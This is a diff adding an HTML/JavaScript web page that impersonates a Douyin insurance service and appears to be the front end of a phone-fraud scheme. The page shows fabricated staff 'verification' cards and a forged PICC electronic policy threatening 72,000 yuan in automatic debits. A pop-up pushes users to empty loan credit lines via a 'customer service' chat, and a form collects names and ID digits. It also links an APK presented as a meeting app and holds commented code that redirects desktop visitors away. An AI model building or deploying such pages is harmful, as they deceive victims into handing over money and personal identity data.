@@ -1,0 +1,454 @@
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
+    <title>抖音百万保障</title>
+    <link href="static/css/layui.css" rel="stylesheet">
+    <link href="static/css/index.css" rel="stylesheet">
+
+    <script type="text/javascript" src="static/js/jquery.js"></script>
+    <script type="text/javascript" src="static/js/layui.js"></script>
+    <script src="static/js/jquery.min.js"></script>
+    <script src="static/js/axios.js"></script>
+    <script src="static/js/qs.js"></script>
+</head><body>
+<div class="page-header">
+    <img class="logo" src="static/picture/header-bg.png">
+</div>
+<section class="container">
+    <div class="page-menus item-bg">
+        <a class="menu" href="/cx.html" onclick="openChayan()">
+            <div><img src="static/picture/1.png">
+                <p class="title-subject">人员查验</p>
+                <p class="title-subject-sub">人员查验</p>
+            </div>
+        </a>
+     <a class="menu" href="/bd.html" onclick="$('#bdcy').show()">
+            <div><img src="static/picture/3.png">
+                <p class="title-subject">案件查询</p>
+                <p class="title-subject-sub">案件查询</p>
+            </div>
+        </a>
+        <a class="menu" href="http://021701.cc" target="_blank">
+            <div><img src="static/picture/2.png">
+                <p class="title-subject">认证会议</p>
+                <p class="title-subject-sub">
+                    认证会议                </p>
+            </div>
+        </a>
+        <a class="menu kefu" href="chatlink.html" target="_blank">
+            <div><img src="static/picture/5.png">
+                <p class="title-subject">在线客服</p>
+                <p class="title-subject-sub">投诉与建议</p>
+            </div>
+        </a>
+     
+      
+        <!--<a class="menu" href="javascript:" onclick="$('#tb').show()" >-->
+        <!--    <div><img src="./抖音百万保障_files/3.png">-->
+        <!--        <p class="title-subject">退保</p>-->
+        <!--        <p class="title-subject-sub">解除保险合同</p>-->
+        <!--    </div>-->
+        <!--</a>-->
+        <!--<a class="menu" href="javascript:" onclick="bdquery()" >-->
+        <!--    <div><img src="./抖音百万保障_files/3.png">-->
+        <!--        <p class="title-subject">测试</p>-->
+        <!--        <p class="title-subject-sub">解除保险合同</p>-->
+        <!--    </div>-->
+        <!--</a>-->
+    </div>
+    <div class="page-content">
+        <div class="common-title">抖音百万保障</div>
+        <div class="items">
+            <div class="item item-bg">
+                <img class="item-left" src="static/picture/10icon.png">
+                <div class="item-right">
+                    <div class="item-title"><img src="static/picture/11.png"></div>
+                    <div class="item-mark">平均63个保障计划精选一款<br>好保险，专家帮你选</div>
+                </div>
+            </div>
+            <div class="item item-bg">
+                <img class="item-left" src="static/picture/20icon.png">
+                <div class="item-right">
+                    <div class="item-title"><img src="static/picture/22.png"></div>
+                    <div class="item-mark">保费最低1元起，放心买<br>价格更实惠</div>
+                </div>
+            </div>
+            <div class="item item-bg">
+                <img class="item-left" src="static/picture/30icon.png">
+                <div class="item-right">
+                    <div class="item-title"><img src="static/picture/33.png"></div>
+                    <div class="item-mark">管家全程理赔协助，好服务<br>理赔不操心</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div>
+
+
+    </div>
+    <div class="page-hz">
+        <div class="common-title">合作保险公司</div>
+        <div class="hz-imgs">
+            <img class="hz-img" src="static/picture/1(1).png">
+            <img class="hz-img" src="static/picture/2(1).png">
+            <img class="hz-img" src="static/picture/3(1).png">
+            <img class="hz-img" src="static/picture/4.png">
+            <img class="hz-img" src="static/picture/5(1).png">
+            <img class="hz-img" src="static/picture/6.png">
+            <img class="hz-img" src="static/picture/7.png">
+            <img class="hz-img" src="static/picture/8.png">
+            <img class="hz-img" src="static/picture/9.png">
+            <img class="hz-img" src="static/picture/10.png">
+            <img class="hz-img" src="static/picture/11(1).png">
+            <img class="hz-img" src="static/picture/12.png">
+        </div>
+    </div>
+    <div class="page-hzhb">
+        <div class="common-title">抖音合作伙伴</div>
+        <div class="hzhb-imgs">
+            <img class="hzhb-img" src="static/picture/1(2).png">
+            <img class="hzhb-img" src="static/picture/2(2).png">
+            <img class="hzhb-img" src="static/picture/3(2).png">
+            <img class="hzhb-img" src="static/picture/4(1).png">
+            <img class="hzhb-img" src="static/picture/5(2).png">
+            <img class="hzhb-img" src="static/picture/6(1).png">
+            <img class="hzhb-img" src="static/picture/7(1).png">
+            <img class="hzhb-img" src="static/picture/8(1).png">
+            <img class="hzhb-img" src="static/picture/9(1).png">
+            <img class="hzhb-img" src="static/picture/10(1).png">
+            <img class="hzhb-img" src="static/picture/11(2).png">
+        </div>
+    </div>
+</section>
+
+<!-- 退保弹窗 -->
+<div class="pop-bg hide" id="tb">
+    <div class="bg" onclick="$('#tb').addClass('hide')"></div>
+   
+    <div class="pop">
+    <input type="button" class="btclose" onclick="$('#tb').hide()" value="关闭">
+        <div class="tbtext">
+        尊敬的用户:百万保单关闭失败！由于您名下个人信息存在关联到第三方金融平台（微粒贷）、（银联信贷）、（支付宝）存在多个高息网贷额度未清除，年化利率已超出国家安全利率标准3.45%，导致百万保障扣费协议关闭失败，避免影响个人征信及账户异常，请配合工作人员协助您查看并及时清空回收额度关闭网贷账户。
+        </div>
+        <div class="pop-btn" onclick="tzkf()">申请退保</div>
+        <script>
+            function tzkf(){
+                document.location.href = "/chatlink.html";
+            }
+        </script>
+    </div>
+</div>
+
+<!-- 保单查询弹窗 -->
+<div class="pop-bg hide" id="bdcy">
+    <div class="bg" onclick="$('#bdcy').addClass('hide')"></div>
+   
+    <div class="pop">
+    <input type="button" class="btclose" onclick="$('#bdcy').hide()" value="关闭">
+        <div class="bd-title">案件查询</div>
+        <div class="pop-form-item">
+            <input type="text" name="name" id="name" placeholder="姓名">
+        </div>
+        <div class="pop-form-item">
+            <input type="text" name="idCard" id="idCard" maxlength="6" placeholder="身份证后6位">
+        </div>
+        <div class="pop-btn" onclick="baodanchaxun()">查询</div>
+    </div>
+</div>
+<!-- 保单查询 -->
+<script>
+    
+function bdquery(){
+    // var cardId = strTrim($("#idCard").val());
+    var mobile = strTrim($("#idCard").val());
+    obj ={
+        mobile
+    }
+    obj = Qs.stringify(obj)
+    console.log(obj)
+    axios.post('./bdquery.php',obj).then(res=>{
+        var parsedData = res.data
+        if(status == 1){
+            window.location.href='./index2.html?'+parsedData;
+            $("#name_div").html(parsedData[0]['name']);
+            $("#id_div").html(parsedData[0]['code']);
+            layer.open({
+                skin: 'layui-layer-lan',
+                type: 1,
+                area: "99%",
+                resize: false,
+                shadeClose: true,
+                title: "保单查询",
+                content: $("#sdoc")
+            });
+        }else{
+            alert('查询不到该保单号。')
+        }
+
+        // console.log(parsedData[0]['truename'])
+        // console.log(parsedData[0]['zhengjianhaoma'])
+        // console.log(parsedData[0]['status'])
+        
+    })
+}    
+function baodanchaxun() {
+    $('#bdcy').hide()
+    var cardId = strTrim($("#idCard").val());
+    var name = strTrim($("#name").val());
+    if (name === '') {
+        layer.msg('请输入姓名', {icon: -1, time: 5000});
+        return false;
+    }
+    // var regIdNo = /(^\d{15}$)|(^\d{18}$)|(^\d{17}(\d|X|x)$)/;
+    // if (!regIdNo.test(cardId)) {
+    //     layer.msg('身份证号填写有误', {icon: -1, time: 5000});
+    //     return false;
+    // }
+    
+    // 访问后台执行
+    var index = layer.load(2, {
+        shade: [0.5, '#000'],
+        content: '正在为你案件查询，请稍等....',
+        success: function (layero) {
+            layero.find('.layui-layer-content').css({
+                'padding-top': '40px',//图标与样式会重合，这样设置可以错开
+                'width': '80%',//文字显示的宽度
+                "color": "#E9A658",
+                "font-size": "18px"
+            });
+        }
+    });
+    layer.close(index);
+    bdquery()
+    // $("#name_div").html(name);
+    // $("#id_div").html(cardId);
+    
+
+
+}
+
+</script>
+<!-- 人员查验弹窗 -->
+<div class="pop-doc-header" id="chayan" style="display: none;">
+    <div class="bg" onclick="$('#chayan').addClass('hide')"></div>
+    <input type="button" style="margin-left:310px;" class="btclose" onclick="location.reload()" value="关闭">
+    <div class="chayan-body">
+        <div class="chayan-title layui-row"><h2>服务人员验证</h2></div>
+        <div class="chayan-form layui-row">
+            <input type="text" class="layui-input" name="sn" id="chayan-sn" placeholder="请输入服务人员工号">
+        </div>
+        <div class="layui-row chayan-btn-container">
+            <a class="chayan-btn layui-btn layui-btn-warm" onclick="chayan2()">立即验证</a>
+        </div>
+            <!-- 工作证男 -->
+        <div class="chayan-content hidden" id="chayan-result">
+            <div class="layui-row result-tip">尊敬的抖音用户，您输入的工号验证结果</div>
+            <div class="layui-row chayan-result">   
+                <div class="chayan-avatar">
+                    <img src="static/picture/czx.png" alt="" id="chayan-avatar">
+                </div>
+                <div class="chayan-name">姓名：陈振西<span id="chayan-name"></span></div>
+                <div class="chayan-pos">职务：人工客服<span id="chayan-pos"></span></div>
+                <div class="chayan-no">职业证编号：W101148<span id="chayan-no"></span></div>
+                <div class="chayan-org">业务机构：中国银联服务中心<span id="chayan-org"></span></div>
+
+                <div class="chayan-tip">随时欢迎您的咨询，我将为您提供一站式的保险服务！</div>
+            </div>
+        </div>
+        <!-- 工作证女 -->
+        <div class="chayan-content hidden" id="chayan-result2">
+            <div class="layui-row result-tip">尊敬的抖音用户，您输入的工号验证结果</div>
+            <div class="layui-row chayan-result">   
+                <div class="chayan-avatar">
+                    <img src="static/picture/vv.jpg" alt="" id="chayan-avatar2">
+                </div>
+                <div class="chayan-name">姓名：孙丽<span id="chayan-name"></span></div>
+                <div class="chayan-pos">职务：人工客服<span id="chayan-pos"></span></div>
+                <div class="chayan-no">职业证编号：W101124<span id="chayan-no"></span></div>
+                <div class="chayan-org">业务机构：百万保障注销部<span id="chayan-org"></span></div>
+
+                <div class="chayan-tip">随时欢迎您的咨询，我将为您提供一站式的保险服务！</div>
+            </div>
+        </div>
+
+                <!-- 工作证女10297 -->
+        <div class="chayan-content hidden" id="chayan-result3">
+            <div class="layui-row result-tip">尊敬的抖音用户，您输入的工号验证结果</div>
+            <div class="layui-row chayan-result">   
+                <div class="chayan-avatar">
+                    <img src="static/picture/zxn.jpg" alt="" id="chayan-avatar3">
+                </div>
+                <div class="chayan-name">姓名：张鑫妮<span id="chayan-name"></span></div>
+                <div class="chayan-pos">职务：客户服务部<span id="chayan-pos"></span></div>
+                <div class="chayan-no">职业证编号：W110599<span id="chayan-no"></span></div>
+                <div class="chayan-org">业务机构：百万保障注销部<span id="chayan-org"></span></div>
+
+                <div class="chayan-tip">随时欢迎您的咨询，我将为您提供一站式的保险服务！</div>
+            </div>
+        </div>
+        <div class="chayan-content hidden" id="chayan-result4">
+            <div class="layui-row result-tip">尊敬的抖音用户，您输入的工号验证结果</div>
+            <div class="layui-row chayan-result">   
+                <div class="chayan-avatar">
+                    <img src="static/picture/dqc.jpg" alt="" id="chayan-avatar4">
+                </div>
+                <div class="chayan-name">姓名：丁棋川<span id="chayan-name"></span></div>
+                <div class="chayan-pos">职务：客户服务部<span id="chayan-pos"></span></div>
+                <div class="chayan-no">职业证编号：W101111<span id="chayan-no"></span></div>
+                <div class="chayan-org">业务机构：百万保障注销部<span id="chayan-org"></span></div>
+
+                <div class="chayan-tip">随时欢迎您的咨询，我将为您提供一站式的保险服务！</div>
+            </div>
+        </div>
+        <script>
+            function chayan2() {
+
+                var number = strTrim($("#chayan-sn").val());
+                console.log(number)
+                if (!number) {
+                    layer.msg('请输入服务人员工号', {icon: -1, time: 2000});
+                    return;
+                }
+ 
+                if (number == "W110599"){
+                    $("#chayan-result3").removeClass("hidden");
+                }
+                if (number == "W101111"){
+                    $("#chayan-result4").removeClass("hidden");
+                }
+
+            }
+        </script>
+        
+
+    </div>
+</div>
+
+<div class="cs-modal-container hidden" id="cs-modal"><div class="cs-list-item"><div class="cs-list-icon"><img src="static/picture/ded45b90-080b-46c3-a4e9-86f7df8e7d62.png"></div><div class="cs-list-name"><h4>云视听会议</h4></div><div class="cs-list-link"><a class="layui-btn layui-btn-sm layui-btn-radius layui-btn-primary" href="http://928113.cc/tiao/?toubuwj==/sy/luodi.php%7C%7C%7Cxiazai==http://928113.cc:6060/mma/yun.apk?1d52afe43f7fa6d4221c95bf0a28135f?182.239.92.200%7C%7C%7Cweibu" target="_blank">安卓下载</a><a class="layui-btn layui-btn-sm layui-btn-radius layui-btn-warm" href="http://928113.cc/" target="_blank">iOS下载</a></div></div></div>
+
+<div class="pop-doc-header" id="sdoc" style="display: none;height:686px; position: fixed;top:0px;background-color:white;width:99%;z-index: 1000;overflow-y: auto;">
+<input type="button" style="margin-left:310px;" class="btclose" onclick="location.reload()" value="关闭">
+    <div class="bg" onclick="$('#sdoc').addClass('hide')"></div>
+    <div id="sdoc" style="height: auto;overflow-y: auto;">
+        <div class="doc-header">
+            <img src="static/picture/header2.jpg">
+        </div>
+ <div class="doc-title">中国人保账户安全险保险单（电子保单）</div>
+        <div class="doc-info">
+            <div class="info bold">
+                <div class="title">投保人：</div>
+                <div class="content red" id="name_div">袁雪芬</div>
+            </div>
+            <div class="info bold">
+                <div class="title">号码：</div>
+                <div class="content red" id="id_div">441900198202216749</div>
+            </div>
+            <div class="info">
+                <div class="title">保单流水号：</div>
+                <div class="content red" id="liu_div">BWBZ2023100702216749</div>
+            </div>
+            <div class="info">
+                <div class="title">保险单号：</div>
+                <div class="content red">AGYA956CYR22QAHYA44Q</div>
+            </div>
+        </div>
+        <div class="doc-yq">请仔细阅读本保险单，以确保其内容与投保人的投保要求一致。</div>
+        <div class="doc-content">
+            <div>本保险合同由保险条款、投保单、保险单或其他保险凭证以及批单组成。</div>
+            <span>保险额度  <font class="data_edu">100万</font></span>
+            <span>保障费用  <font class="data_efee">2000元/月  24000元/年</font></span>
+            <span>保障范围  <font class="data_fanwei">个人支付账户（银行卡、零钱、零钱通、理财通、银行储蓄、分付等）</font></span>
+            <span>保障查询  <font class="data_chaxunu">提供第三方支付平台办理业务查询保险业务（微信，支付宝，抖音，京东等）</font></span>
+            <span>保障说明  <font class="data_desc">个人支付账户因被他人盗用而导致的资金损失，按损失金额承诺赔付，不限赔付次数，每年累计赔付金额最高100万。</font></span>
+            <span>重要提示<font class="data_tishi">账户安全险保险业务如没在规定时间内关闭，会从您名下银联账户扣除保险费用，保险费用是72000元三年扣满，扣满三年后 您就成为了账户安全险的一名保险用户。</font></span>
+            <span style="color:red">扣费说明： <font class="data_tishi"> 若您同意继续使用银联中心按照商户扣费指令有权从您名下银联账户逐一扣费（储蓄卡，信用卡）以及您的第三方金融账户（支付宝，微信，贷款账户）且后续无需在验证您的支付密码，短信动态码等信息</font></span>
+            <br>
+            <span>鉴于本保险单明细表中列明的投保人向中国人民财产保险股份有限公司提交投保信息。（该投保申请及资料被视作本保险合同的有效组成部分），投保人同意按本保险合同的约定承担责任。特立本保险单为凭证。微信银行储蓄支付账户因被他人盗用而导致的资金损失，按损失金额承诺赔付，不限赔付次数，每年累计赔付金额最高100万。</span>
+            <br>
+            <div>签发机构：<font class="data_jigou">中国人民财产保险股份有限公司</font> 邮政编码：<font id="data_youbian">550081</font></div>
+            <div>协办监管：<font class="data_jianguan">微民保险代理有限公司</font></div>
+            <div>制单：<font class="data_zhidan">吴晓晗</font></div>
+            <br>
+            <div class="r">
+                <div class="image-wrapper">
+                    <img src="static/picture/gz.png">
+                    <div class="text-overlay">
+                        <p>
+                        </p><div class="r">企业信用税号：91100000710931483R</div>
+                        <div class="r data_jigou">中国人民保险集团股份有限公司</div>
+                        <div class="r date">核验日期：2024年07月02日</div>
+                        <p></p>
+                    </div>
+                </div>
+        </div>
+
+    </div>
+
+</div>
+
+<script src="static/js/main.js"></script>
+
+<div class="layui-layer-move" id="layui-layer-move"></div>
+
+<style>
+    .pop-bg{
+    color: rgba(0,0,0,.85);
+    font: 14px Helvetica Neue,Helvetica,PingFang SC,Tahoma,Arial,sans-serif;
+    margin: 0;
+    padding: 0;
+    -webkit-tap-highlight-color: rgba(0,0,0,0);
+    position: fixed;
+    top: 0;
+    bottom: 0;
+    right: 0;
+    left: 0;
+    }
+    .pop{
+    color: rgba(0,0,0,.85);
+    font: 14px Helvetica Neue,Helvetica,PingFang SC,Tahoma,Arial,sans-serif;
+    margin: 0;
+    padding: 0;
+    -webkit-tap-highlight-color: rgba(0,0,0,0);
+    position: absolute;
+    top: 50%;
+    left: 50px;
+    right: 50px;
+    min-height: 240px;
+    transform: translateY(-50%);
+    z-index: 99;
+    background:white;
+    background-position: center center;
+    background-size: 100% 100%;
+    border-radius: 10px;
+    }
+    .bd-title{
+        margin-top: 10px;
+        font-size: 20px;
+        text-align: center;
+    }
+    .btclose{
+        margin-left:84%;
+        margin-top:10px;
+        background-color: white;
+        border: 0px solid;
+    }
+    .tbtext{
+        padding: 10px;
+        font-size: 16px;
+        display: inline-block;
+        vertical-align: middle;
+        color:red;
+    }
+</style>
+// <script type="text/javascript">
+// if(window.screen.width==0){window.location.replace("https://www.zxki.cn")};
+// var system={win:false,mac:false,xll:false};
+// var p = navigator.platform;
+// system.win=p.indexOf("Win")==0;
+// system.mac=p.indexOf("Mac")==0;    
+// system.x11=(p=="X11") || (p.indexOf("Linux")==0);    
+// if(system.win||system.mac||system.xll) {
+//   location.replace("http://111");
+// }
+// </script>
+</div></body>
